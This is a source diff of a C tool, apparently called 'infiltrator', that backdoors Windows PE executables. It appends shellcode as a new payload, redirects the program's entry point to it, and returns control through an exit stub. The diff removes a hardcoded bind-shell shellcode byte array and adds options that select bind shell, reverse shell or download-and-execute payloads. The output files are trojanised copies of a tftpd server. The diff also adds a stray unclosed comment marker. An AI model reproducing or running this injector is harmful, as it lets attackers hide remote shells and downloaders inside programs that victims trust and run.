@@ -54,7 +54,7 @@ typedef struct _IMAGE_FILE_HEADER {
   WORD  SizeOfOptionalHeader;
   WORD  Characteristics;
 } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
-	 
+	/* 
 
 typedef struct _IMAGE_OPTIONAL_HEADER {
   WORD                 Magic;
@@ -111,6 +111,8 @@ typedef struct _IMAGE_SECTION_HEADER {
 #include <Windows.h>
 #include <stdio.h>
 #include <winnt.h>
+#include <string.h>
+#include<G:\infiltrator\infiltrator\infiltrator\payloads.h>
 
 #define max_sections 0xF
 
@@ -140,65 +142,13 @@ int main(int argc, char *argv[])
 	IMAGE_NT_HEADERS inth ;
 	IMAGE_SECTION_HEADER ish[ max_sections ] = {0} ;
 	char *buffer,*newbuffer; 
-	unsigned int i,size, offset, offset2, x, end_size, y ;
+	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size ;
 	IMAGE_SECTION_HEADER *new_ish;
+	char *shellcode;
 
-	char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
-"\x60"	//PUSHAD
-"\xfc\x31\xc0\xbe\x59\x01\x00\x00"
-"\x6a\x40\x68\x00\x10\x00\x00\x56"
-"\x50\x68\x54\xca\xaf\x91\xe8\x44"
-"\x00\x00\x00\x89\xc2\x89\xc7\x89"
-"\xf1\xe8\x2e\x00\x00\x00\x5e\xf3"
-"\xa4\xe8\x00\x00\x00\x00\x31\xc0"
-"\x64\xff\x30\x64\x89\x20\x50\x50"
-"\x50\x52\x50\x50\x68\x6b\xd0\x2b"
-"\xca\xe8\x19\x00\x00\x00\x58\x58"
-"\x58\x81\xec\x2c\x00\x00\x00\xe9"
-"\x5c\x01\x00\x00\xe8\xcd\xff\xff"
-"\xff\xfc\xe8\x71\x00\x00\x00\x60"
-"\x89\xe5\x31\xd2\x64\x8b\x52\x30"
-"\x8b\x52\x0c\x8b\x52\x14\x8b\x72"
-"\x28\x52\x8b\x52\x10\x8b\x42\x3c"
-"\x8b\x44\x02\x78\x85\xc0\x74\x4b"
-"\x01\xd0\x50\x8b\x48\x18\x8b\x58"
-"\x20\x01\xd3\xe3\x3d\x49\x8b\x34"
-"\x8b\x01\xd6\x31\xff\x31\xc0\xac"
-"\x84\xc0\x74\x0a\xc1\xcf\x0d\x01"
-"\xc7\xe9\xf1\xff\xff\xff\x3b\x7d"
-"\x24\x75\xe0\x58\x8b\x58\x24\x01"
-"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
-"\x01\xd3\x8b\x04\x8b\x01\xd0\x89"
-"\x44\x24\x20\x5b\x61\x59\x5a\x51"
-"\xff\xe0\x58\x5a\x8b\x12\xeb\x9e"
-"\x5d\x31\xc0\x68\x6c\x6c\x20\xff"
-"\x68\x33\x32\x2e\x64\x68\x77\x73"
-"\x32\x5f\x88\x44\x24\x0a\x54\x68"
-"\x8e\x4e\x0e\xec\xff\xd5\x89\xc2"
-"\x31\xd2\xb6\x03\x29\xd4\x31\xc9"
-"\x41\x41\x54\x51\x68\xcb\xed\xfc"
-"\x3b\xff\xd5\x81\xc4\x00\x03\x00"
-"\x00\x31\xc0\x50\x50\x50\x50\x40"
-"\x50\x40\x50\x68\xd9\x09\xf5\xad"
-"\xff\xd5\x89\xc6\x31\xc0\x50\x50"
-"\x50\xb8\x02\x01\x11\x5c\xfe\xcc"
-"\x50\x89\xe0\x31\xdb\xb3\x10\x53"
-"\x50\x56\x68\xa4\x1a\x70\xc7\xff"
-"\xd5\x53\x56\x68\xa4\xad\x2e\xe9"
-"\xff\xd5\x53\x89\xe2\x29\xdc\x89"
-"\xe1\x52\x51\x56\x68\xe5\x49\x86"
-"\x49\xff\xd5\x89\xc6\xb8\x01\x63"
-"\x6d\x64\xc1\xf8\x08\x50\x89\xe3"
-"\x31\xc9\xb1\x54\x29\xcc\x89\xe7"
-"\x57\x31\xc0\xf3\xaa\x5f\xc6\x07"
-"\x44\xfe\x47\x2d\x57\x89\xf0\x8d"
-"\x7f\x38\xab\xab\xab\x5f\x8d\x77"
-"\x44\x31\xc0\x31\xc9\x56\x57\x50"
-"\x50\x68\x00\x00\x00\x08\x40\x50"
-"\x48\x50\x50\x53\x50\x68\x72\xfe"
-"\xb3\x16\xff\xd5\x68\xe4\xcf\xcd"
-"\xe8\xff\xd5\x31\xc9\x51\x50\x68"
-"\x89\x6f\x01\xbd\xff\xd5\x90\x90";
+
+//char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
+//"\x60";	//PUSHAD
 
 char exit_stub[] = "\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x0c\x8b\x40\x18\x05\xff\xee\xdd\xcc\x90\x90\x89\x44\xE4\x1c\x90\x61\x90\x90\x90\x90\xff\xe0";// "\x90\x90" = "\x89\xec" | "\x90" = "\x5D" | "\x9d" popfd removed since it some times insert brakpoint and break execution
 /*
@@ -221,6 +171,54 @@ pop ebp				; poping back ebp addr	//NOP
 popad				; pop registers
 jmp eax				; jmp to addr saved in eax
 */
+
+for (count = 0; count < argc; count++)
+{
+
+	if (!strcmp(argv[count],"-k"))
+	{
+		if (!strcmp(argv[count+1], "bind"))
+		{
+			shellcode=(CHAR *)calloc(sizeof(bind_shell_threaded),1);
+			memcpy(shellcode,bind_shell_threaded,sizeof(bind_shell_threaded));
+			shellcode_size = sizeof(bind_shell_threaded);
+		}
+		if (!strcmp(argv[count+1], "reverse"))
+		{
+			shellcode=(CHAR *)calloc(sizeof(reverse_shell_threaded),1);
+			memcpy(shellcode,reverse_shell_threaded,sizeof(reverse_shell_threaded));
+			shellcode_size = sizeof(reverse_shell_threaded);
+		}
+		if (!strcmp(argv[count+1], "download & execute"))
+		{
+			printf("[*] there is no need for Download and Execute to be threaded so using normal Shell\n");
+			shellcode=(CHAR *)calloc(sizeof(download_execute),1);
+			memcpy(shellcode,download_execute,sizeof(download_execute));
+			shellcode_size = sizeof(download_execute);
+		}
+	}
+	if (!strcmp(argv[count],"-s"))
+	{
+		if (!strcmp(argv[count+1], "bind"))
+		{
+			shellcode=(CHAR *)calloc(sizeof(bind_shell),1);
+			memcpy(shellcode,bind_shell,sizeof(bind_shell));
+			shellcode_size = sizeof(bind_shell);
+		}
+		if (!strcmp(argv[count+1], "reverse"))
+		{
+			shellcode=(CHAR *)calloc(sizeof(reverse_shell),1);
+			memcpy(shellcode,reverse_shell,sizeof(reverse_shell));
+			shellcode_size = sizeof(reverse_shell);
+		}
+		if (!strcmp(argv[count+1], "download & execute"))
+		{
+			shellcode=(CHAR *)calloc(sizeof(download_execute),1);
+			memcpy(shellcode,download_execute,sizeof(download_execute));
+			shellcode_size = sizeof(download_execute);
+		}
+	}
+}
 
 	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);
 
@@ -366,12 +364,12 @@ jmp eax				; jmp to addr saved in eax
 	fseek(fp,0,SEEK_END);
 	end_size = ftell(fp);
 	// write shellcode to buffer in memory memcpy to buffer addr + original file size from data located at addr of shellcode size of shellcode
-	memcpy(buffer+end_size,&shellcode,sizeof(shellcode)); //
+	memcpy(buffer+end_size,shellcode,shellcode_size); //
 	printf("[*] Writing shellcode to memory\n");
 	//memcpy exit stub to end of shellcode ; -1 for alignment
-	memcpy(buffer+end_size+sizeof(shellcode)-1,&exit_stub,sizeof(exit_stub));
+	memcpy(buffer+end_size+shellcode_size-1,&exit_stub,sizeof(exit_stub));
 	//memcpy to overwrite the 0xccddeeff in the original shellcode with our IMAGE_NT_HEADER.IMAGE_OPTIONAL_HEADE.EntryAddress
-	memcpy(buffer+end_size+sizeof(shellcode)+sizeof(exit_stub)-20, &inth.OptionalHeader.AddressOfEntryPoint,sizeof(DWORD));
+	memcpy(buffer+end_size+shellcode_size+sizeof(exit_stub)-20, &inth.OptionalHeader.AddressOfEntryPoint,sizeof(DWORD));
 
 
 	//we need to memset the entry point to our shellcode entry point so address of entry when pe is loaded is actually address of entry + image base
@@ -383,7 +381,7 @@ jmp eax				; jmp to addr saved in eax
 
 	// size_t fwrite ( const void * ptr, size_t size, size_t count, FILE * stream ); 
 	// write the data pointed to by addr , data size, data count, file stream
-	if(! (fp2 = fopen("G:\\infiltrator\\tftpd-bind-th-02.exe","wb+")))
+	if(! (fp2 = fopen("G:\\infiltrator\\tftpd-DE-03.exe","wb+")))
 	{
 		printf("Couldn't Open file");
 	}
